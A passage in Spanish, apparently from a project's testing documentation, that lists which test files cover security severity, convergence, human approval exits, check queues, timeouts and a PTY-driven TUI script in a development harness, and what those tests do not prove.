y vuelta, temas claro/oscuro, navegación hasta el final del comando, cancelar y aprobar explícitamente con GitHub falso; no es una evaluación visual humana. Lo que agregó el incidente de #98 y #99 tiene sus propios tests. La severidad de Seguridad (`harness-lenses`, `development-lenses`, `development-review`): falla cerrada sin severidad, con una inválida o desalineada, parseo con claves de más, partes sin resultado, el refuter y que un aviso no frena `verified` ni Land. La convergencia (`harness-security-convergence`, `development-security-convergence`, con Git real): qué baja y qué no, sin comparación, una base parcial, todas las rutas del hallazgo, rutas cortas y lo aceptado que reaparece. Las salidas humanas (`harness-accept-risk`, `development-accept-risk`, `harness-extra-round`, `development-extra-round`, `lifecycle-land`, `lifecycle-corrections`): sólo desde la TUI, por contenido y texto exacto, lo que borra la aceptación, el tope de vueltas y que no reanudan. El amend de rojos (`harness-amend`, `development-flow` con Git real): rojo con amend en la misma vuelta, retry que apunta a amend, 126/127 e interrumpidos. La paridad de la guía con el reducer (`development-autonomy`, `development-rounds`, `development-policy`): la regla de gates y la cuenta de vueltas. Los precedentes (`harness-lens-precedents`): tope, recorte y Seguridad sin la nota. La cola de checks (`harness-check-queue`, `development-check-turn`): espera, PID muerto, edad, tope, enlaces, datos ajenos, Esc y el setup que sólo espera la primera vez. Los timeouts (`harness-check-timing`, `harness-commands`, `development-check-turn`): piso de 1,5×, también desde un setup, tope de 1800 s y la sugerencia tras un corte. El guion PTY con plazo por fase (`pty-driver`, `workspace-triage-runtime`): cada paso espera lo que pinta la TUI y una falla dice en qué fase quedó. No prueban la calibración de blocker o aviso contra un modelo real. El empaquetado comprueba el binario instalado. No equivalen a una prueba contra GitHub/OMI real ni a una evaluación de calidad de modelos: esas pruebas requieren una persona.
